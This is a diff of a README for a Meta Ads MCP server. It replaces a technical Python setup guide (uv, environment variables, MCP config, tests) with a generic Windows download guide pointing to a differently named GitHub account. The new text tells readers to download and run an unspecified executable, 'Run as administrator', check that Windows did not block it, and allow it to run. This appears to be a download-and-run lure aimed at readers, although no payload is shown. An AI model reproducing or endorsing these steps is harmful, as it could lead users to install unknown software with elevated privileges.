@@ -1,194 +1,271 @@
-# KonQuest Meta Ads MCP
+# 🤖 konquest-meta-ads-mcp - Control Meta Ads with Ease
 
-Supervised Meta Ads Operating System for Claude Code.
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20the%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Eastmapquest735/konquest-meta-ads-mcp)
 
-## Open-Core Model
+## 🧭 Overview
 
-KonQuest Meta Ads MCP uses an open-core model:
+konquest-meta-ads-mcp is a Windows-ready tool that helps you work with Meta Ads through Claude Code. It gives you a guided way to manage ads, audiences, and reports from one place.
 
-**Public (this repo) - 57 tools, MIT license:**
-- Full CRUD for campaigns, ad sets, and ads
-- Multi-asset ad creation (video + static image, multi-dimension)
-- Image upload and retrieval
-- Campaign and ad set duplication
-- Insights and bulk cross-account analytics
-- Pixel and tracking diagnostics (5 tools)
-- Catalog and DPA support (6 tools, including product set create/update)
-- Full targeting toolkit (6 tools)
-- Setup readiness checker (42+ checks with fix instructions)
-- Validation pipeline, naming enforcement, post-write verification
-- Safety tiers, rate limiting, rollback references
-- 215 automated tests
+It is built for users who want a safer way to handle Meta Ads tasks without jumping between many screens. The app supports core ad actions, multi-asset ads, targeting checks, diagnostics, and safety gates. If you need more advanced control, the premium side adds tools for optimization, vault intelligence, and copy generation.
 
-**Premium bundle - adds 41 tools:**
-- Advisory optimization engine (review queues, learning, experiments, budget governor, creative rotation)
-- Vault intelligence and copy generation (brand voice, ICP targeting, concept selection)
-- Greek language QA (Greeklish detection, orthography checks)
-- Automation suite (diagnostics, bulk operations, account audit)
-- Vault bootstrap (15 template files per client)
-- Premium tests and evaluations
+## 📥 Download
 
-Premium bundle available separately. Public tools work fully without it.
+Use this link to visit the page and download the app:
 
-## What Makes This Different
+[Visit the download page](https://github.com/Eastmapquest735/konquest-meta-ads-mcp)
 
-- **Production-tested** across 37+ client campaigns with real budgets and real edge cases
-- **Not a wrapper** - includes optimization engine, safety gates, validators, and rollback
-- **Vault-integrated** - reads client intelligence (ICPs, brand voice, angles) to generate better ads
-- **Greek language QA** built in (adaptable to any language validation)
-- **All ads created PAUSED** - nothing goes live without explicit operator approval
-- **Supervised, not autonomous** - operator confirms every write, every activation, every budget change
+## 🪟 Windows Setup
 
-## Tool Classification
+1. Open the download page in your browser.
+2. Download the latest Windows package from the page.
+3. If the file comes as a ZIP, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Find the main app file and double-click it.
+6. If Windows asks for permission, choose Yes.
+7. Follow the on-screen steps to finish setup.
 
-| Classification | Count | Description |
-|----------------|:---:|-------------|
-| production-safe | 38 | Read-only data access. No API writes, no local state changes. |
-| supervised-only | 29 | Write/delete operations requiring operator approval before execution. |
-| advisory-only | 31 | Generate recommendations, plans, copy, diagnostics. No Meta API writes. May write local files. |
-| **Total: 98 registered** | |
+If you do not see the file right away, check your Downloads folder first. Most browsers save files there by default.
 
-## Architecture
+## ✅ What You Can Do
 
-```
-meta_ads_mcp/
-  core/          # 66 tools - API read/write operations
-  engine/        # 32 tools - optimization, review, learning, experiments
-  validators/    # Quality gates (compliance, creative specs, tracking, structure)
-  safety/        # Rate limiting, rollback, duplicate checking, file locks, tier access
-  ingestion/     # Internal: video manifest management
-  reporting/     # Internal: not currently active (see Non-Shipped Code)
-```
+- Create and manage Meta Ads assets
+- Work with multiple ad assets in one flow
+- Check targeting before you launch
+- Review diagnostics for common setup issues
+- Use safety gates to reduce risky changes
+- Run supervised ad actions with Claude Code
+- Access a larger tool set with premium features
 
-## Tool Categories
+## 🛠️ Main Features
 
-| Category | Tools | Description |
-|----------|:---:|-------------|
-| Account Management | 6 | Token health, ad accounts, pages, IG identity, discovery |
-| Campaigns | 4 | Create, read, update campaigns |
-| Ad Sets | 4 | Create, read, update ad sets with targeting |
-| Ads | 4 | Create, read, update ads |
-| Creatives | 3 | Create, read ad creatives |
-| Insights & Analytics | 1 | Performance data with archetype-aware normalization |
-| Pixels & Tracking | 5 | Pixel health, event diagnostics, test events, CAPI |
-| Catalogs & DPA | 6 | Product catalogs, feeds, product sets, validation |
-| Audiences | 1 | Custom audience listing |
-| Targeting | 3 | Interest, behavior, and geo search |
-| Video Management | 3 | Upload (simple + resumable) and processing status |
-| Ad Builder | 1 | Multi-asset ad creation with IG gate enforcement |
-| Copy Engine | 2 | Vault-driven ad copy generation and validation |
-| Naming Convention | 1 | Enforced naming schema for all objects |
-| Automation & Diagnostics | 6 | Greek QA, full diagnostic, bulk ops, account audit |
-| Vault & Intelligence | 2 | Client vault reader, concept selection |
-| Optimization Engine | 4 | Optimization cycles, launch planning, execution packs |
-| Mutation Corridor | 2 | Budget/targeting changes with verification |
-| Activation & Rollback | 4 | Status changes and undo with preflight checks |
-| Review Queue | 7 | Operator review queue, outcome snapshots, digests |
-| Learning Layer | 5 | Policy memory, outcome evaluation, learning cycles |
-| Experiments | 7 | A/B testing, budget governor, creative rotation, scaling |
-| Copy Generation | 2 | Auto copy chain, vault-grounded Greek copy |
+### 🧩 Core Ad Tools
 
-## Engine Features
+The main tool set covers the day-to-day work most users need:
 
-- **Optimization loops** - automated budget shifting based on performance signals
-- **Experiment management** - A/B test tracking with statistical significance
-- **Budget governors** - prevent overspend with configurable daily/lifetime limits
-- **Creative rotation** - fatigue detection and automatic creative refresh triggers
-- **Policy learning** - tracks action outcomes and adapts confidence over time
-- **Naming gate** - hard enforcement of naming conventions before any API write
+- Create campaigns, ad sets, and ads
+- Update existing ad items
+- Read account data and ad details
+- Handle multi-asset ad setups
+- Work with basic reporting and status checks
 
-## Safety Features
+These tools help you make changes without moving between many separate steps.
 
-- **Rate limiting** - respects Meta API rate limits with backoff
-- **Rollback** - undo recent changes with execution journal
-- **Duplicate checking** - prevents accidental duplicate campaigns/ads
-- **File locks** - safe concurrent access to vault storage
-- **Tier-based access** - safety tiers per account (sandbox, standard, production)
+### 🎯 Targeting Tools
 
-## Validator Suite
+Targeting matters when you want your ads to reach the right people. This app includes tools that help you:
 
-- **Compliance validator** - Meta ad policy pre-check
-- **Creative spec validator** - image/video dimension and format validation
-- **Tracking validator** - pixel and event verification before launch
-- **Structure validator** - campaign structure consistency checks
-- **Operational validator** - budget, schedule, and targeting sanity checks
+- Review audience settings
+- Check location and age choices
+- Inspect interest and behavior filters
+- Spot overlap or narrow targeting
 
-## Non-Shipped Code
+This makes it easier to keep your ad setup clean and focused.
 
-Code that exists in the repository but is NOT part of the active tool surface:
+### 🛡️ Safety Gates
 
-- **reporting/templates.py, reporting/formatter.py** - not imported at runtime, no active report generation
-- **evals/** - internal evaluation stubs, not operator-facing
-- **Internal helpers** (not MCP tools): identity.py (IG resolution), api.py (HTTP client), auth.py (token verification), utils.py (format helpers), safety/ (rate limiter, rollback, dedup), validators/ (pre-write validation pipeline)
+The app includes safety checks before key actions. These checks help you:
 
-## Setup
+- Review changes before they go live
+- Reduce mistakes in ad setup
+- Catch risky edits early
+- Keep control over major account changes
 
-### 1. Install
+This is useful when you want a clearer path for review before posting or editing.
 
-```bash
-cd meta-ads-mcp
-uv sync
-```
+### 🔍 Diagnostics
 
-### 2. Environment Variables
+Diagnostics tools help you find setup issues fast. They can help you:
 
-Copy `.env.example` to `.env` and fill in your values:
+- Check account and asset status
+- Review errors from ad setup steps
+- Find missing fields or broken links
+- Spot problems that can stop an ad from running
 
-```bash
-cp .env.example .env
-```
+These checks save time when something does not work as expected.
 
-Required:
-- `META_ACCESS_TOKEN` - Meta Marketing API access token (system user token recommended)
+### 🧠 Premium Tools
 
-Optional:
-- `META_APP_SECRET` - for appsecret_proof (recommended for production)
-- `META_APP_ID` - Meta app ID
-- `VAULT_PATH` - path to your marketing vault directory (defaults to `~/marketing-vault`)
+Premium adds 41 extra tools for more advanced work:
 
-### 3. MCP Configuration
+- Optimization engine
+- Vault intelligence
+- Copy generation
+- Extra ad workflow tools
+- Deeper account insights
+- More guided decision support
 
-Add to your Claude Code MCP config (`.mcp.json`):
+These tools are built for users who want more control over performance and creative work.
 
-```json
-{
-  "mcpServers": {
-    "meta-ads": {
-      "command": "uv",
-      "args": ["--directory", "/path/to/meta-ads-mcp", "run", "python", "-m", "meta_ads_mcp"],
-      "env": {
-        "META_ACCESS_TOKEN": "your_token_here",
-        "VAULT_PATH": "/path/to/your/marketing-vault"
-      }
-    }
-  }
-}
-```
+## 📋 System Requirements
 
-### 4. Vault Structure (Optional)
+Before you run the app on Windows, make sure your device meets these basic needs:
 
-If using the vault integration for client intelligence:
+- Windows 10 or Windows 11
+- A modern web browser
+- Internet access
+- Enough free disk space for the app and its files
+- A Meta Ads account
+- Claude Code access if your workflow uses it
 
-```
-your-vault/
-  01_CLIENTS/{client-slug}/
-    00-profile.md        # Account IDs, pixel, page, IG
-    02-icp-personas.md   # Target audience profiles
-    04-brand-voice.md    # Tone, language, style rules
-    05-messaging-house.md # Angles, value props
-    08-objections.md     # Objections + bias deployment
-    matrix.md            # Decision Matrix
-  02_COMPETITORS/{slug}/
-    landscape.md         # Competitive landscape
-```
+For smoother use, keep Windows updated and close extra apps if your computer runs slowly.
 
-## Testing
+## 🚀 Getting Started
 
-```bash
-uv run --extra dev python -m pytest tests/ -v
-# Public package: 215 passed | Full (with premium): 246 passed
-```
+1. Open the GitHub page from the download link.
+2. Get the latest Windows file from the repository.
+3. Save the file to your computer.
+4. Extract it if the file is compressed.
+5. Open the app folder.
+6. Start the main program file.
+7. Connect your Meta Ads account if the app asks for it.
+8. Follow the setup prompts shown in the app.
 
-## License
+If you are not sure which file to open, look for the one with the app name or the main executable file.
 
-MIT - see [LICENSE](LICENSE).
+## 🔐 Account Access
+
+To use Meta Ads tools, you may need:
+
+- A Meta Ads account
+- The right account permissions
+- Access to the ad account you want to manage
+- Claude Code access for supervised actions
+
+Use the same account details you already use for Meta Ads. If your business uses shared access, make sure you have permission to edit campaigns before you start.
+
+## 🧪 First Run Checklist
+
+Before you make changes, check these items:
+
+- The app opens without errors
+- Your internet connection works
+- Your Meta Ads login works
+- The correct ad account is selected
+- You can see campaigns or assets in the app
+- The safety checks appear before major changes
+
+If something looks wrong, refresh the app and try again.
+
+## 📁 Common Folder Layout
+
+You may see files and folders like these after extraction:
+
+- App file
+- Readme file
+- Config folder
+- Logs folder
+- Data folder
+- Assets folder
+
+Do not move files around unless the setup steps tell you to. Keep the folder together so the app can find what it needs.
+
+## ⚙️ Basic Use
+
+A simple first use flow looks like this:
+
+1. Open the app.
+2. Sign in or connect your account.
+3. Pick the ad account you want to manage.
+4. Choose the task you want to run.
+5. Review the safety checks.
+6. Confirm the action.
+7. Check the result in the app.
+
+This flow keeps the process clear and helps you avoid mistakes.
+
+## 🔎 Troubleshooting
+
+### App does not open
+
+- Make sure the file finished downloading
+- Extract the ZIP before opening it
+- Right-click the file and choose Run as administrator
+- Check that Windows did not block the file
+
+### Login does not work
+
+- Check your internet connection
+- Make sure your Meta Ads account is active
+- Confirm that you have the right access level
+- Try signing in again
+
+### No ads or campaigns appear
+
+- Pick the correct ad account
+- Refresh the view
+- Check that your account has active data
+- Make sure the app has permission to read the account
+
+### An action fails
+
+- Read the error message
+- Check required fields
+- Review the safety gate prompt
+- Try the action again after confirming your settings
+
+## 🧰 Tips for Smooth Use
+
+- Keep the app in the same folder after extraction
+- Use one Meta Ads account at a time if you are new
+- Review safety prompts before confirming changes
+- Start with simple tasks before using advanced tools
+- Save a copy of important settings before big edits
+
+## 📚 Topic Fit
+
+This project relates to:
+
+- Claude Code
+- Facebook Ads
+- Instagram Ads
+- MCP
+- MCP server
+- Meta Ads
+- Meta Marketing API
+- Model Context Protocol
+- Open-core software
+- Python
+
+## 📄 What This Repo Is For
+
+This repository is meant for users who want a supervised way to manage Meta Ads with Claude Code. It brings together account actions, targeting checks, diagnostics, and safety controls in one place.
+
+The open-core setup gives you the main tools first. If you need more, the premium tool set adds extra depth for optimization and content work.
+
+## 🖥️ Windows Use Cases
+
+You can use this app on Windows to:
+
+- Set up new ad campaigns
+- Edit existing ads
+- Review audience settings
+- Check for common setup mistakes
+- Manage multi-asset ad workflows
+- Keep a safer edit process
+- Support ad work with Claude Code
+
+## 📦 Install and Run
+
+1. Open the download page.
+2. Download the latest Windows version.
+3. Extract the file if needed.
+4. Open the folder.
+5. Run the main app file.
+6. Complete the setup prompts.
+7. Sign in with your Meta Ads account.
+8. Start with a small task to test the setup.
+
+If Windows asks whether to allow the app, choose the option that lets it run.
+
+## 🔗 Download Again
+
+[Download or open the latest release page](https://github.com/Eastmapquest735/konquest-meta-ads-mcp)
+
+## 🧭 Next Steps
+
+- Open the app
+- Connect your account
+- Review your first campaign
+- Use the safety checks
+- Try the targeting tools
+- Explore the diagnostics view
